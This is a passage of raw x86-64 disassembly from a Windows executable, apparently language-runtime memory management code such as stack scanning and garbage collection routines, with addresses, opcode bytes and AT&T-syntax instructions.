  408f49:	48 89 ea             	mov    %rbp,%rdx
  408f4c:	4c 89 e1             	mov    %r12,%rcx
  408f4f:	4c 8b 04 f0          	mov    (%rax,%rsi,8),%r8
  408f53:	48 ff c6             	inc    %rsi
  408f56:	e8 84 ff ff ff       	call   0x408edf
  408f5b:	eb dc                	jmp    0x408f39
  408f5d:	4c 89 c2             	mov    %r8,%rdx
  408f60:	45 0f b6 e9          	movzbl %r9b,%r13d
  408f64:	e8 65 a7 ff ff       	call   0x4036ce
  408f69:	48 89 da             	mov    %rbx,%rdx
  408f6c:	48 89 e9             	mov    %rbp,%rcx
  408f6f:	48 89 c6             	mov    %rax,%rsi
  408f72:	e8 57 a7 ff ff       	call   0x4036ce
  408f77:	48 39 c6             	cmp    %rax,%rsi
  408f7a:	49 89 c0             	mov    %rax,%r8
  408f7d:	74 1a                	je     0x408f99
  408f7f:	48 85 f6             	test   %rsi,%rsi
  408f82:	74 15                	je     0x408f99
  408f84:	48 89 f2             	mov    %rsi,%rdx
  408f87:	4c 89 e1             	mov    %r12,%rcx
  408f8a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  408f8f:	e8 fd f5 ff ff       	call   0x408591
  408f94:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  408f99:	48 8b 73 08          	mov    0x8(%rbx),%rsi
  408f9d:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  408fa1:	49 8d 04 34          	lea    (%r12,%rsi,1),%rax
  408fa5:	48 01 ee             	add    %rbp,%rsi
  408fa8:	4d 85 c0             	test   %r8,%r8
  408fab:	48 8b 0a             	mov    (%rdx),%rcx
  408fae:	48 89 c7             	mov    %rax,%rdi
  408fb1:	f3 a4                	rep movsb (%rsi),(%rdi)
  408fb3:	74 1a                	je     0x408fcf
  408fb5:	45 89 e9             	mov    %r13d,%r9d
  408fb8:	48 89 ea             	mov    %rbp,%rdx
  408fbb:	4c 89 e1             	mov    %r12,%rcx
  408fbe:	48 83 c4 38          	add    $0x38,%rsp
  408fc2:	5b                   	pop    %rbx
  408fc3:	5e                   	pop    %rsi
  408fc4:	5f                   	pop    %rdi
  408fc5:	5d                   	pop    %rbp
  408fc6:	41 5c                	pop    %r12
  408fc8:	41 5d                	pop    %r13
  408fca:	e9 10 ff ff ff       	jmp    0x408edf
  408fcf:	48 83 c4 38          	add    $0x38,%rsp
  408fd3:	5b                   	pop    %rbx
  408fd4:	5e                   	pop    %rsi
  408fd5:	5f                   	pop    %rdi
  408fd6:	5d                   	pop    %rbp
  408fd7:	41 5c                	pop    %r12
  408fd9:	41 5d                	pop    %r13
  408fdb:	c3                   	ret
  408fdc:	53                   	push   %rbx
  408fdd:	48 83 ec 20          	sub    $0x20,%rsp
  408fe1:	48 89 cb             	mov    %rcx,%rbx
  408fe4:	e8 2e 9b ff ff       	call   0x402b17
  408fe9:	48 8b 48 38          	mov    0x38(%rax),%rcx
  408fed:	48 85 c9             	test   %rcx,%rcx
  408ff0:	74 0c                	je     0x408ffe
  408ff2:	48 39 d9             	cmp    %rbx,%rcx
  408ff5:	74 0b                	je     0x409002
  408ff7:	48 39 cb             	cmp    %rcx,%rbx
  408ffa:	48 0f 4c d9          	cmovl  %rcx,%rbx
  408ffe:	48 89 58 38          	mov    %rbx,0x38(%rax)
  409002:	48 83 c4 20          	add    $0x20,%rsp
  409006:	5b                   	pop    %rbx
  409007:	c3                   	ret
  409008:	56                   	push   %rsi
  409009:	53                   	push   %rbx
  40900a:	48 83 ec 38          	sub    $0x38,%rsp
  40900e:	48 8b 05 9b e9 00 00 	mov    0xe99b(%rip),%rax        # 0x4179b0
  409015:	48 8b 31             	mov    (%rcx),%rsi
  409018:	48 89 cb             	mov    %rcx,%rbx
  40901b:	48 89 f2             	mov    %rsi,%rdx
  40901e:	8b 08                	mov    (%rax),%ecx
  409020:	ff 15 ae 23 03 00    	call   *0x323ae(%rip)        # 0x43b3d4
  409026:	48 8d 05 5b 01 00 00 	lea    0x15b(%rip),%rax        # 0x409188
  40902d:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  409032:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  409037:	e8 a0 ff ff ff       	call   0x408fdc
  40903c:	e8 69 ab ff ff       	call   0x403baa
  409041:	48 89 d9             	mov    %rbx,%rcx
  409044:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  409049:	ff d0                	call   *%rax
  40904b:	e8 c7 9a ff ff       	call   0x402b17
  409050:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  409057:	e8 90 fa ff ff       	call   0x408aec
  40905c:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  409063:	48 89 f1             	mov    %rsi,%rcx
  409066:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  40906d:	00 
  40906e:	e8 41 fa ff ff       	call   0x408ab4
  409073:	31 c0                	xor    %eax,%eax
  409075:	48 83 c4 38          	add    $0x38,%rsp
  409079:	5b                   	pop    %rbx
  40907a:	5e                   	pop    %rsi
  40907b:	c3                   	ret
  40907c:	48 83 ec 28          	sub    $0x28,%rsp
  409080:	e8 92 9a ff ff       	call   0x402b17
  409085:	48 8b 48 20          	mov    0x20(%rax),%rcx
  409089:	48 85 c9             	test   %rcx,%rcx
  40908c:	74 0e                	je     0x40909c
  40908e:	48 83 c1 10          	add    $0x10,%rcx
  409092:	ba 01 00 00 00       	mov    $0x1,%edx
  409097:	e8 aa 1f 00 00       	call   0x40b046
  40909c:	48 8b 48 28          	mov    0x28(%rax),%rcx
  4090a0:	e8 93 ca ff ff       	call   0x405b38
  4090a5:	b9 01 00 00 00       	mov    $0x1,%ecx
  4090aa:	e8 59 25 00 00       	call   0x40b608
  4090af:	90                   	nop
  4090b0:	56                   	push   %rsi
  4090b1:	53                   	push   %rbx
  4090b2:	48 83 ec 48          	sub    $0x48,%rsp
  4090b6:	48 89 cb             	mov    %rcx,%rbx
  4090b9:	48 89 d6             	mov    %rdx,%rsi
  4090bc:	e8 67 dd ff ff       	call   0x406e28
  4090c1:	48 89 73 10          	mov    %rsi,0x10(%rbx)
  4090c5:	31 c9                	xor    %ecx,%ecx
  4090c7:	49 89 d9             	mov    %rbx,%r9
  4090ca:	48 89 03             	mov    %rax,(%rbx)
  4090cd:	48 8d 44 24 3c       	lea    0x3c(%rsp),%rax
  4090d2:	ba 00 f0 1f 00       	mov    $0x1ff000,%edx
  4090d7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  4090dc:	48 8b 05 cd df 00 00 	mov    0xdfcd(%rip),%rax        # 0x4170b0
  4090e3:	4c 8d 05 1e ff ff ff 	lea    -0xe2(%rip),%r8        # 0x409008
  4090ea:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%rsp)
  4090f1:	00 
  4090f2:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  4090f9:	00 
  4090fa:	ff 10                	call   *(%rax)
  4090fc:	48 85 c0             	test   %rax,%rax
  4090ff:	48 89 43 08          	mov    %rax,0x8(%rbx)
  409103:	7f 7c                	jg     0x409181
  409105:	48 8b 0d 54 e5 00 00 	mov    0xe554(%rip),%rcx        # 0x417660
  40910c:	ba 30 00 00 00       	mov    $0x30,%edx
  409111:	e8 2c c1 ff ff       	call   0x405242
  409116:	48 8b 0d 53 e6 00 00 	mov    0xe653(%rip),%rcx        # 0x417770
  40911d:	48 89 c3             	mov    %rax,%rbx
  409120:	48 8b 05 29 e5 00 00 	mov    0xe529(%rip),%rax        # 0x417650
  409127:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  40912b:	48 89 03             	mov    %rax,(%rbx)
  40912e:	48 8d 05 d8 da 00 00 	lea    0xdad8(%rip),%rax        # 0x416c0d
  409135:	48 89 43 10          	mov    %rax,0x10(%rbx)
  409139:	e8 5c c0 ff ff       	call   0x40519a
  40913e:	48 85 f6             	test   %rsi,%rsi
  409141:	48 89 43 18          	mov    %rax,0x18(%rbx)
  409145:	74 08                	je     0x40914f
  409147:	48 89 f1             	mov    %rsi,%rcx
  40914a:	e8 b1 4b 00 00       	call   0x40dd00
  40914f:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
  409153:	31 d2                	xor    %edx,%edx
  409155:	e8 02 b0 ff ff       	call   0x40415c
  40915a:	4c 8d 0d c3 da 00 00 	lea    0xdac3(%rip),%r9        # 0x416c24
  409161:	48 89 d9             	mov    %rbx,%rcx
  409164:	48 c7 44 24 20 0b 01 	movq   $0x10b,0x20(%rsp)
  40916b:	00 00 
  40916d:	4c 8d 05 bc da 00 00 	lea    0xdabc(%rip),%r8        # 0x416c30
  409174:	48 8d 15 92 da 00 00 	lea    0xda92(%rip),%rdx        # 0x416c0d
  40917b:	e8 35 ca ff ff       	call   0x405bb5
  409180:	90                   	nop
  409181:	48 83 c4 48          	add    $0x48,%rsp
  409185:	5b                   	pop    %rbx
  409186:	5e                   	pop    %rsi
  409187:	c3                   	ret
  409188:	55                   	push   %rbp
  409189:	53                   	push   %rbx
  40918a:	48 89 e5             	mov    %rsp,%rbp
  40918d:	48 81 ec 48 01 00 00 	sub    $0x148,%rsp
  409194:	48 8d 9d e8 fe ff ff 	lea    -0x118(%rbp),%rbx
  40919b:	48 89 4d 18          	mov    %rcx,0x18(%rbp)
  40919f:	e8 73 99 ff ff       	call   0x402b17
  4091a4:	48 89 d9             	mov    %rbx,%rcx
  4091a7:	48 89 85 e0 fe ff ff 	mov    %rax,-0x120(%rbp)
  4091ae:	e8 56 ce ff ff       	call   0x406009
  4091b3:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  4091b7:	48 89 ea             	mov    %rbp,%rdx
  4091ba:	e8 89 24 00 00       	call   0x40b648
  4091bf:	48 98                	cltq
  4091c1:	48 85 c0             	test   %rax,%rax
  4091c4:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
  4091cb:	75 07                	jne    0x4091d4
  4091cd:	48 8b 45 18          	mov    0x18(%rbp),%rax
  4091d1:	ff 50 10             	call   *0x10(%rax)
  4091d4:	e8 d8 cd ff ff       	call   0x405fb1
  4091d9:	48 8b 85 e0 fe ff ff 	mov    -0x120(%rbp),%rax
  4091e0:	31 db                	xor    %ebx,%ebx
  4091e2:	48 8b 40 08          	mov    0x8(%rax),%rax
  4091e6:	48 85 c0             	test   %rax,%rax
  4091e9:	74 03                	je     0x4091ee
  4091eb:	48 8b 18             	mov    (%rax),%rbx
  4091ee:	48 ff cb             	dec    %rbx
  4091f1:	48 85 db             	test   %rbx,%rbx
  4091f4:	78 25                	js     0x40921b
  4091f6:	48 8b 95 e0 fe ff ff 	mov    -0x120(%rbp),%rdx
  4091fd:	48 89 d8             	mov    %rbx,%rax
  409200:	48 c1 e0 04          	shl    $0x4,%rax
  409204:	48 03 42 08          	add    0x8(%rdx),%rax
  409208:	48 8b 48 18          	mov    0x18(%rax),%rcx
  40920c:	48 85 c9             	test   %rcx,%rcx
  40920f:	74 05                	je     0x409216
  409211:	ff 50 10             	call   *0x10(%rax)
  409214:	eb d8                	jmp    0x4091ee
  409216:	ff 50 10             	call   *0x10(%rax)
  409219:	eb d3                	jmp    0x4091ee
  40921b:	48 83 bd f0 fe ff ff 	cmpq   $0x0,-0x110(%rbp)
  409222:	00 
  409223:	74 06                	je     0x40922b
  409225:	e8 52 fe ff ff       	call   0x40907c
  40922a:	90                   	nop
  40922b:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
  409232:	5b                   	pop    %rbx
  409233:	5d                   	pop    %rbp
  409234:	c3                   	ret
  409235:	90                   	nop
  409236:	90                   	nop
  409237:	90                   	nop
  409238:	90                   	nop
  409239:	90                   	nop
  40923a:	90                   	nop
  40923b:	90                   	nop
  40923c:	90                   	nop
  40923d:	90                   	nop
  40923e:	90                   	nop
  40923f:	90                   	nop
  409240:	53                   	push   %rbx
  409241:	48 83 ec 20          	sub    $0x20,%rsp
  409245:	48 89 d3             	mov    %rdx,%rbx
  409248:	48 c1 ea 0c          	shr    $0xc,%rdx
  40924c:	e8 53 a4 ff ff       	call   0x4036a4
  409251:	31 d2                	xor    %edx,%edx
  409253:	48 85 c0             	test   %rax,%rax
  409256:	74 24                	je     0x40927c
  409258:	48 c1 eb 03          	shr    $0x3,%rbx
  40925c:	ba 01 00 00 00       	mov    $0x1,%edx
  409261:	48 89 d9             	mov    %rbx,%rcx
  409264:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  40926a:	49 89 c8             	mov    %rcx,%r8
  40926d:	48 d3 e2             	shl    %cl,%rdx
  409270:	49 c1 e8 06          	shr    $0x6,%r8
  409274:	4a 85 54 c0 10       	test   %rdx,0x10(%rax,%r8,8)
  409279:	0f 95 c2             	setne  %dl
  40927c:	88 d0                	mov    %dl,%al
  40927e:	48 83 c4 20          	add    $0x20,%rsp
  409282:	5b                   	pop    %rbx
  409283:	c3                   	ret
  409284:	55                   	push   %rbp
  409285:	41 54                	push   %r12
  409287:	57                   	push   %rdi
  409288:	56                   	push   %rsi
  409289:	53                   	push   %rbx
  40928a:	48 89 e5             	mov    %rsp,%rbp
  40928d:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
  409294:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
  409298:	48 8d 8d 00 ff ff ff 	lea    -0x100(%rbp),%rcx
  40929f:	48 89 ea             	mov    %rbp,%rdx
  4092a2:	e8 a1 23 00 00       	call   0x40b648
  4092a7:	85 c0                	test   %eax,%eax
  4092a9:	0f 85 c9 00 00 00    	jne    0x409378
  4092af:	48 8b 45 30          	mov    0x30(%rbp),%rax
  4092b3:	48 8d 9d 00 ff ff ff 	lea    -0x100(%rbp),%rbx
  4092ba:	49 89 ec             	mov    %rbp,%r12
  4092bd:	48 8b 38             	mov    (%rax),%rdi
  4092c0:	48 89 fe             	mov    %rdi,%rsi
  4092c3:	49 39 dc             	cmp    %rbx,%r12
  4092c6:	76 1f                	jbe    0x4092e7
  4092c8:	48 8b 13             	mov    (%rbx),%rdx
  4092cb:	48 83 c3 08          	add    $0x8,%rbx
  4092cf:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  4092d3:	e8 e4 a7 ff ff       	call   0x403abc
  4092d8:	48 8b 53 fc          	mov    -0x4(%rbx),%rdx
  4092dc:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  4092e0:	e8 d7 a7 ff ff       	call   0x403abc
  4092e5:	eb dc                	jmp    0x4092c3
  4092e7:	48 83 e3 f8          	and    $0xfffffffffffffff8,%rbx
  4092eb:	48 83 ee 40          	sub    $0x40,%rsi
  4092ef:	48 39 de             	cmp    %rbx,%rsi
  4092f2:	76 6d                	jbe    0x409361
  4092f4:	48 8b 13             	mov    (%rbx),%rdx
  4092f7:	48 83 c3 40          	add    $0x40,%rbx
  4092fb:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  4092ff:	e8 b8 a7 ff ff       	call   0x403abc
  409304:	48 8b 53 c8          	mov    -0x38(%rbx),%rdx
  409308:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  40930c:	e8 ab a7 ff ff       	call   0x403abc
  409311:	48 8b 53 d0          	mov    -0x30(%rbx),%rdx
  409315:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  409319:	e8 9e a7 ff ff       	call   0x403abc
  40931e:	48 8b 53 d8          	mov    -0x28(%rbx),%rdx
  409322:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  409326:	e8 91 a7 ff ff       	call   0x403abc
  40932b:	48 8b 53 e0          	mov    -0x20(%rbx),%rdx
  40932f:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  409333:	e8 84 a7 ff ff       	call   0x403abc
  409338:	48 8b 53 e8          	mov    -0x18(%rbx),%rdx
  40933c:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  409340:	e8 77 a7 ff ff       	call   0x403abc
  409345:	48 8b 53 f0          	mov    -0x10(%rbx),%rdx
  409349:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  40934d:	e8 6a a7 ff ff       	call   0x403abc
  409352:	48 8b 53 f8          	mov    -0x8(%rbx),%rdx
  409356:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  40935a:	e8 5d a7 ff ff       	call   0x403abc
  40935f:	eb 8e                	jmp    0x4092ef
  409361:	48 39 df             	cmp    %rbx,%rdi
  409364:	72 12                	jb     0x409378
  409366:	48 8b 13             	mov    (%rbx),%rdx
  409369:	48 83 c3 08          	add    $0x8,%rbx
  40936d:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  409371:	e8 46 a7 ff ff       	call   0x403abc
  409376:	eb e9                	jmp    0x409361
  409378:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
  40937f:	5b                   	pop    %rbx
  409380:	5e                   	pop    %rsi
  409381:	5f                   	pop    %rdi
  409382:	41 5c                	pop    %r12
  409384:	5d                   	pop    %rbp
  409385:	c3                   	ret
  409386:	53                   	push   %rbx
  409387:	48 83 ec 30          	sub    $0x30,%rsp
  40938b:	48 89 cb             	mov    %rcx,%rbx
  40938e:	e8 84 97 ff ff       	call   0x402b17
  409393:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
  409398:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  40939f:	00 00 
  4093a1:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  4093a6:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  4093ab:	48 8b 50 38          	mov    0x38(%rax),%rdx
  4093af:	31 c0                	xor    %eax,%eax
  4093b1:	48 39 d9             	cmp    %rbx,%rcx
  4093b4:	77 06                	ja     0x4093bc
  4093b6:	48 39 da             	cmp    %rbx,%rdx
  4093b9:	0f 93 c0             	setae  %al
  4093bc:	48 83 c4 30          	add    $0x30,%rsp
  4093c0:	5b                   	pop    %rbx
  4093c1:	c3                   	ret
  4093c2:	56                   	push   %rsi
  4093c3:	53                   	push   %rbx
  4093c4:	48 83 ec 28          	sub    $0x28,%rsp
  4093c8:	48 89 ce             	mov    %rcx,%rsi
  4093cb:	e8 47 97 ff ff       	call   0x402b17
  4093d0:	48 89 c3             	mov    %rax,%rbx
  4093d3:	48 8b 46 08          	mov    0x8(%rsi),%rax
  4093d7:	48 8b 40 20          	mov    0x20(%rax),%rax
  4093db:	48 85 c0             	test   %rax,%rax
  4093de:	74 14                	je     0x4093f4
  4093e0:	48 ff 83 98 00 00 00 	incq   0x98(%rbx)
  4093e7:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
  4093eb:	ff d0                	call   *%rax
  4093ed:	48 ff 8b 98 00 00 00 	decq   0x98(%rbx)
  4093f4:	48 83 c4 28          	add    $0x28,%rsp
  4093f8:	5b                   	pop    %rbx
  4093f9:	5e                   	pop    %rsi
  4093fa:	c3                   	ret
  4093fb:	57                   	push   %rdi
  4093fc:	56                   	push   %rsi
  4093fd:	53                   	push   %rbx
  4093fe:	48 83 ec 20          	sub    $0x20,%rsp
  409402:	48 8d 79 68          	lea    0x68(%rcx),%rdi
  409406:	48 89 ce             	mov    %rcx,%rsi
  409409:	48 83 7e 18 00       	cmpq   $0x0,0x18(%rsi)
  40940e:	7e 46                	jle    0x409456
  409410:	48 8b 56 28          	mov    0x28(%rsi),%rdx
  409414:	48 8b 1a             	mov    (%rdx),%rbx
  409417:	48 83 23 fb          	andq   $0xfffffffffffffffb,(%rbx)
  40941b:	48 8b 46 18          	mov    0x18(%rsi),%rax
  40941f:	48 8b 4c c2 f8       	mov    -0x8(%rdx,%rax,8),%rcx
  409424:	48 ff c8             	dec    %rax
  409427:	48 89 0a             	mov    %rcx,(%rdx)
  40942a:	48 89 46 18          	mov    %rax,0x18(%rsi)
  40942e:	48 83 3b 07          	cmpq   $0x7,(%rbx)
  409432:	77 d5                	ja     0x409409
  409434:	48 89 d9             	mov    %rbx,%rcx
  409437:	e8 86 ff ff ff       	call   0x4093c2
  40943c:	48 89 d9             	mov    %rbx,%rcx
  40943f:	ba 02 00 00 00       	mov    $0x2,%edx
  409444:	e8 91 ab ff ff       	call   0x403fda
  409449:	48 89 da             	mov    %rbx,%rdx
  40944c:	48 89 f9             	mov    %rdi,%rcx
  40944f:	e8 de a2 ff ff       	call   0x403732
  409454:	eb b3                	jmp    0x409409
  409456:	b0 01                	mov    $0x1,%al
  409458:	48 83 c4 20          	add    $0x20,%rsp
  40945c:	5b                   	pop    %rbx
  40945d:	5e                   	pop    %rsi
  40945e:	5f                   	pop    %rdi
  40945f:	c3                   	ret
  409460:	41 57                	push   %r15
  409462:	41 56                	push   %r14
  409464:	41 55                	push   %r13
  409466:	41 54                	push   %r12
  409468:	55                   	push   %rbp
  409469:	57                   	push   %rdi
  40946a:	56                   	push   %rsi
  40946b:	53                   	push   %rbx
  40946c:	48 83 ec 48          	sub    $0x48,%rsp
  409470:	48 8b 41 18          	mov    0x18(%rcx),%rax
  409474:	48 39 41 10          	cmp    %rax,0x10(%rcx)
  409478:	49 89 cd             	mov    %rcx,%r13
  40947b:	7e 11                	jle    0x40948e
  40947d:	48 8b 81 00 29 00 00 	mov    0x2900(%rcx),%rax
  409484:	48 39 41 08          	cmp    %rax,0x8(%rcx)
  409488:	0f 8f 2f 04 00 00    	jg     0x4098bd
  40948e:	49 83 7d 60 00       	cmpq   $0x0,0x60(%r13)
  409493:	0f 85 24 04 00 00    	jne    0x4098bd
  409499:	e8 2a a4 ff ff       	call   0x4038c8
  40949e:	49 39 85 70 33 00 00 	cmp    %rax,0x3370(%r13)
  4094a5:	49 0f 4d 85 70 33 00 	cmovge 0x3370(%r13),%rax
  4094ac:	00 
  4094ad:	31 c9                	xor    %ecx,%ecx
  4094af:	49 89 85 70 33 00 00 	mov    %rax,0x3370(%r13)
  4094b6:	49 8d 45 68          	lea    0x68(%r13),%rax
  4094ba:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  4094bf:	49 8b 85 10 31 00 00 	mov    0x3110(%r13),%rax
  4094c6:	48 89 c2             	mov    %rax,%rdx
  4094c9:	4c 8b 0a             	mov    (%rdx),%r9
  4094cc:	4c 39 ca             	cmp    %r9,%rdx
  4094cf:	74 09                	je     0x4094da
  4094d1:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
  4094d5:	4c 89 ca             	mov    %r9,%rdx
  4094d8:	eb ef                	jmp    0x4094c9
  4094da:	49 89 4d 68          	mov    %rcx,0x68(%r13)
  4094de:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  4094e2:	48 3b 00             	cmp    (%rax),%rax
  4094e5:	74 0a                	je     0x4094f1
  4094e7:	48 8b 50 18          	mov    0x18(%rax),%rdx
  4094eb:	48 8b 40 08          	mov    0x8(%rax),%rax
  4094ef:	eb f1                	jmp    0x4094e2
  4094f1:	49 89 55 70          	mov    %rdx,0x70(%r13)
  4094f5:	4c 89 e9             	mov    %r13,%rcx
  4094f8:	e8 87 fd ff ff       	call   0x409284
  4094fd:	49 8b 45 30          	mov    0x30(%r13),%rax
  409501:	4c 89 e9             	mov    %r13,%rcx
  409504:	49 39 85 78 33 00 00 	cmp    %rax,0x3378(%r13)
  40950b:	49 0f 4d 85 78 33 00 	cmovge 0x3378(%r13),%rax
  409512:	00 
  409513:	49 ff 85 58 33 00 00 	incq   0x3358(%r13)
  40951a:	49 89 85 78 33 00 00 	mov    %rax,0x3378(%r13)
  409521:	e8 d5 fe ff ff       	call   0x4093fb
  409526:	84 c0                	test   %al,%al
  409528:	0f 84 4c 03 00 00    	je     0x40987a
  40952e:	49 8b 45 08          	mov    0x8(%r13),%rax
  409532:	49 39 85 00 29 00 00 	cmp    %rax,0x2900(%r13)
  409539:	0f 8c 3b 03 00 00    	jl     0x40987a
  40953f:	49 8d ad d8 33 00 00 	lea    0x33d8(%r13),%rbp
  409546:	48 89 e9             	mov    %rbp,%rcx
  409549:	ff 15 c5 1d 03 00    	call   *0x31dc5(%rip)        # 0x43b314
  40954f:	49 8b 9d c8 33 00 00 	mov    0x33c8(%r13),%rbx
  409556:	48 85 db             	test   %rbx,%rbx
  409559:	74 6f                	je     0x4095ca
  40955b:	48 8b 43 08          	mov    0x8(%rbx),%rax
  40955f:	31 f6                	xor    %esi,%esi
  409561:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
  409565:	48 39 f7             	cmp    %rsi,%rdi
  409568:	7c 5b                	jl     0x4095c5
  40956a:	4c 8b 64 f3 10       	mov    0x10(%rbx,%rsi,8),%r12
  40956f:	e8 a3 95 ff ff       	call   0x402b17
  409574:	48 8b 90 e8 33 00 00 	mov    0x33e8(%rax),%rdx
  40957b:	4c 8b 88 f8 33 00 00 	mov    0x33f8(%rax),%r9
  409582:	49 8d 4c 24 f0       	lea    -0x10(%r12),%rcx
  409587:	48 ff ca             	dec    %rdx
  40958a:	4d 8d 1c d1          	lea    (%r9,%rdx,8),%r11
  40958e:	49 89 d2             	mov    %rdx,%r10
  409591:	4d 89 d9             	mov    %r11,%r9
  409594:	4d 85 d2             	test   %r10,%r10
  409597:	78 22                	js     0x4095bb
  409599:	4d 89 cc             	mov    %r9,%r12
  40959c:	49 83 e9 08          	sub    $0x8,%r9
  4095a0:	49 3b 49 08          	cmp    0x8(%r9),%rcx
  4095a4:	75 10                	jne    0x4095b6
  4095a6:	4d 8b 0b             	mov    (%r11),%r9
  4095a9:	4d 89 0c 24          	mov    %r9,(%r12)
  4095ad:	48 89 90 e8 33 00 00 	mov    %rdx,0x33e8(%rax)
  4095b4:	eb 05                	jmp    0x4095bb
  4095b6:	49 ff ca             	dec    %r10
  4095b9:	eb d9                	jmp    0x409594
  4095bb:	e8 43 a7 ff ff       	call   0x403d03
  4095c0:	48 ff c6             	inc    %rsi
  4095c3:	eb a0                	jmp    0x409565
  4095c5:	48 8b 1b             	mov    (%rbx),%rbx
  4095c8:	eb 8c                	jmp    0x409556
  4095ca:	48 89 e9             	mov    %rbp,%rcx
  4095cd:	ff 15 99 1d 03 00    	call   *0x31d99(%rip)        # 0x43b36c
  4095d3:	49 83 7d 18 00       	cmpq   $0x0,0x18(%r13)
  4095d8:	7e 0a                	jle    0x4095e4
  4095da:	4c 89 e9             	mov    %r13,%rcx
  4095dd:	e8 19 fe ff ff       	call   0x4093fb
  4095e2:	eb ef                	jmp    0x4095d3
  4095e4:	49 8b 8d a0 33 00 00 	mov    0x33a0(%r13),%rcx
  4095eb:	4d 8d b5 90 33 00 00 	lea    0x3390(%r13),%r14
  4095f2:	48 85 c9             	test   %rcx,%rcx
  4095f5:	74 0d                	je     0x409604
  4095f7:	48 8b 19             	mov    (%rcx),%rbx
  4095fa:	e8 df a2 ff ff       	call   0x4038de
  4095ff:	48 89 d9             	mov    %rbx,%rcx
  409602:	eb ee                	jmp    0x4095f2
  409604:	49 8b 8d a8 33 00 00 	mov    0x33a8(%r13),%rcx
  40960b:	31 db                	xor    %ebx,%ebx
  40960d:	49 c7 85 a0 33 00 00 	movq   $0x0,0x33a0(%r13)
  409614:	00 00 00 00 
  409618:	e8 c1 a2 ff ff       	call   0x4038de
  40961d:	b9 00 20 00 00       	mov    $0x2000,%ecx
  409622:	49 c7 85 a8 33 00 00 	movq   $0x0,0x33a8(%r13)
  409629:	00 00 00 00 
  40962d:	49 c7 85 90 33 00 00 	movq   $0x0,0x3390(%r13)
  409634:	00 00 00 00 
  409638:	e8 09 90 ff ff       	call   0x402646
  40963d:	49 8b 7d 40          	mov    0x40(%r13),%rdi
  409641:	49 c7 85 98 33 00 00 	movq   $0x3ff,0x3398(%r13)
  409648:	ff 03 00 00 
  40964c:	49 89 85 a8 33 00 00 	mov    %rax,0x33a8(%r13)
  409653:	49 8b 45 30          	mov    0x30(%r13),%rax
  409657:	49 c7 85 90 33 00 00 	movq   $0x0,0x3390(%r13)
  40965e:	00 00 00 00 
  409662:	49 c7 85 a0 33 00 00 	movq   $0x0,0x33a0(%r13)
  409669:	00 00 00 00 
  40966d:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  409671:	48 39 de             	cmp    %rbx,%rsi
  409674:	7c 11                	jl     0x409687
  409676:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  40967a:	4c 89 e9             	mov    %r13,%rcx
  40967d:	48 ff c3             	inc    %rbx
  409680:	e8 f7 a9 ff ff       	call   0x40407c
  409685:	eb ea                	jmp    0x409671
  409687:	49 83 bd 00 34 00 00 	cmpq   $0x0,0x3400(%r13)
  40968e:	00 
  40968f:	75 23                	jne    0x4096b4
  409691:	48 8b 05 08 e3 00 00 	mov    0xe308(%rip),%rax        # 0x4179a0
  409698:	31 db                	xor    %ebx,%ebx
  40969a:	48 8b 3d ef e2 00 00 	mov    0xe2ef(%rip),%rdi        # 0x417990
  4096a1:	48 8b 30             	mov    (%rax),%rsi
  4096a4:	48 ff ce             	dec    %rsi
  4096a7:	48 39 de             	cmp    %rbx,%rsi
  4096aa:	7c 08                	jl     0x4096b4
  4096ac:	ff 14 df             	call   *(%rdi,%rbx,8)
  4096af:	48 ff c3             	inc    %rbx
  4096b2:	eb f3                	jmp    0x4096a7
  4096b4:	48 8b 05 25 b4 02 00 	mov    0x2b425(%rip),%rax        # 0x434ae0
  4096bb:	31 db                	xor    %ebx,%ebx
  4096bd:	48 8d 3d bc 46 02 00 	lea    0x246bc(%rip),%rdi        # 0x42dd80
  4096c4:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  4096c8:	48 39 de             	cmp    %rbx,%rsi
  4096cb:	7c 08                	jl     0x4096d5
  4096cd:	ff 14 df             	call   *(%rdi,%rbx,8)
  4096d0:	48 ff c3             	inc    %rbx
  4096d3:	eb f3                	jmp    0x4096c8
  4096d5:	49 8b 85 b0 33 00 00 	mov    0x33b0(%r13),%rax
  4096dc:	31 db                	xor    %ebx,%ebx
